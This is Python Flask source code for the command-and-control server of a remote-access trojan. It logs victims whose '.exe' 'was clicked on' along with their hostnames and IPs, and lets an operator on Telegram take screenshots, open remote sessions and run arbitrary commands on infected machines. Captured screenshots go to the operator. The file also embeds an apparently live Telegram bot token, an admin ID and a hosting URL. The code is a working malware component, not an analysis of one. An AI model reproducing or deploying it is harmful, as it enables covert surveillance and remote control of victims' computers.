from flask import Flask, request, jsonify
import json
import os
import time
import threading
import requests

app = Flask(__name__)

# ================= CONFIGURATION =================
BOT_TOKEN = "8370598742:AAGtfxRT9rVDOThRavBnq_dFJFSXyHocK1s"  # REPLACE with your bot token
ADMIN_ID = 6586114356       # REPLACE with your numeric user ID
# =================================================

devices = {}
device_lock = threading.Lock()
DATA_FILE = "devices_data.json"
logs = {}

def load_devices():
    global devices
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            devices = json.load(f)

def save_devices():
    with open(DATA_FILE, 'w') as f:
        json.dump(devices, f, indent=2)

def send_telegram_message(chat_id, message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML'}
    try:
        requests.post(url, json=data, timeout=5)
    except:
        pass

def send_telegram_photo(chat_id, photo_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        with open(photo_path, 'rb') as f:
            files = {'photo': f}
            data = {'chat_id': chat_id}
            requests.post(url, files=files, data=data, timeout=10)
    except Exception as e:
        send_telegram_message(chat_id, f"❌ Error sending screenshot: {str(e)}")

load_devices()

@app.route('/register', methods=['POST'])
def register_device():
    data = request.json
    device_id = data.get('device_id')
    exe_name = data.get('exe_name')
    computer_info = data.get('computer_info')
    group_id = data.get('group_id')
    
    with device_lock:
        devices[device_id] = {
            'exe_name': exe_name,
            'computer_info': computer_info,
            'last_seen': time.time(),
            'status': 'online',
            'group_id': group_id,
            'pending_command': None
        }
        save_devices()
    
    notification = f"🚨 <b>{exe_name}.exe</b> was clicked on: <code>{computer_info.get('hostname', 'Unknown')}</code> (IP: {computer_info.get('ip', 'N/A')})"
    if group_id:
        send_telegram_message(group_id, notification)
    
    return jsonify({'status': 'registered'})

@app.route('/devices', methods=['GET'])
def get_devices():
    return jsonify(devices)

@app.route('/command', methods=['POST'])
def send_command():
    data = request.json
    device_id = data.get('device_id')
    command = data.get('command')
    
    with device_lock:
        if device_id in devices:
            devices[device_id]['pending_command'] = command
            save_devices()
            return jsonify({'status': 'command sent to ' + device_id})
        else:
            return jsonify({'status': 'device not found'}), 404

@app.route('/clear_command', methods=['POST'])
def clear_command():
    data = request.json
    device_id = data.get('device_id')
    with device_lock:
        if device_id in devices:
            devices[device_id]['pending_command'] = None
            save_devices()
    return jsonify({'status': 'cleared'})

@app.route('/upload_screenshot', methods=['POST'])
def upload_screenshot():
    device_id = request.form.get('device_id')
    file = request.files.get('file')
    
    if file and device_id:
        temp_path = f"/tmp/screenshot_{device_id}.png"
        file.save(temp_path)
        send_telegram_photo(ADMIN_ID, temp_path)
        send_telegram_message(ADMIN_ID, f"📸 Screenshot from <code>{device_id}</code>")
        os.remove(temp_path)
        return jsonify({'status': 'screenshot received'})
    return jsonify({'status': 'error'}), 400

@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    update = request.json
    
    if 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '').strip()
        
        if chat_id != ADMIN_ID:
            send_telegram_message(chat_id, "⛔ Unauthorized access denied.")
            return 'OK', 200

        # --- /devices ---
        if text == '/devices':
            if not devices:
                send_telegram_message(chat_id, "📭 No devices connected.")
            else:
                msg = "🖥️ <b>Connected Devices:</b>\n"
                for idx, (device_id, info) in enumerate(devices.items(), 1):
                    exe = info.get('exe_name', 'Unknown')
                    host = info.get('computer_info', {}).get('hostname', 'Unknown')
                    ip = info.get('computer_info', {}).get('ip', 'N/A')
                    status = "🟢 Online" if time.time() - info.get('last_seen', 0) < 60 else "🟡 Inactive"
                    msg += f"{idx}. <code>{device_id}</code> | {exe}.exe | {host} ({ip}) | {status}\n"
                send_telegram_message(chat_id, msg)

        # --- /screenshot ---
        elif text.startswith('/screenshot'):
            parts = text.split(' ', 1)
            if len(parts) < 2:
                send_telegram_message(chat_id, "⚠️ Usage: /screenshot DEVICE_ID")
            else:
                device_id = parts[1].strip()
                with device_lock:
                    if device_id in devices:
                        devices[device_id]['pending_command'] = "SCREENSHOT"
                        save_devices()
                        send_telegram_message(chat_id, f"📸 Screenshot requested from <code>{device_id}</code>")
                    else:
                        send_telegram_message(chat_id, f"❌ Device <code>{device_id}</code> not found.")

        # --- /remote ---
        elif text.startswith('/remote'):
            parts = text.split(' ', 1)
            if len(parts) < 2:
                send_telegram_message(chat_id, "⚠️ Usage: /remote DEVICE_ID")
            else:
                device_id = parts[1].strip()
                with device_lock:
                    if device_id in devices:
                        devices[device_id]['pending_command'] = "REMOTE"
                        save_devices()
                        send_telegram_message(chat_id, f"🔗 Remote session requested for <code>{device_id}</code>")
                    else:
                        send_telegram_message(chat_id, f"❌ Device <code>{device_id}</code> not found.")

        # --- /cmd ---
        elif text.startswith('/cmd'):
            parts = text.split(' ', 2)
            if len(parts) < 3:
                send_telegram_message(chat_id, "⚠️ Usage: /cmd DEVICE_ID \"command\"")
            else:
                device_id = parts[1].strip()
                command = parts[2].strip()
                with device_lock:
                    if device_id in devices:
                        devices[device_id]['pending_command'] = f"CMD:{command}"
                        save_devices()
                        send_telegram_message(chat_id, f"⌨️ Command sent to <code>{device_id}</code>")
                    else:
                        send_telegram_message(chat_id, f"❌ Device <code>{device_id}</code> not found.")

        # --- /disconnect ---
        elif text.startswith('/disconnect'):
            parts = text.split(' ', 1)
            if len(parts) < 2:
                send_telegram_message(chat_id, "⚠️ Usage: /disconnect DEVICE_ID")
            else:
                device_id = parts[1].strip()
                with device_lock:
                    if device_id in devices:
                        devices[device_id]['pending_command'] = "CMD:pdagent stop"
                        save_devices()
                        send_telegram_message(chat_id, f"🔌 Disconnecting <code>{device_id}</code>")
                    else:
                        send_telegram_message(chat_id, f"❌ Device <code>{device_id}</code> not found.")

        # --- /help ---
        elif text == '/help':
            help_msg = (
                "🤖 <b>Available Commands:</b>\n\n"
                "/devices - List all connected devices\n"
                "/screenshot DEVICE_ID - Take screenshot\n"
                "/remote DEVICE_ID - Start remote session\n"
                "/cmd DEVICE_ID \"command\" - Run any command\n"
                "/disconnect DEVICE_ID - Disconnect device\n"
                "/help - Show this menu"
            )
            send_telegram_message(chat_id, help_msg)

        else:
            send_telegram_message(chat_id, f"❓ Unknown command. Type /help")

    return 'OK', 200

@app.route('/set_webhook', methods=['GET'])
def set_webhook():
    webhook_url = f"https://dollar-1rtv.onrender.com/webhook/{BOT_TOKEN}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}"
    response = requests.get(url)
    return jsonify(response.json())

@app.route('/')
def home():
    return "✅ PD_Research Server is RUNNING!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)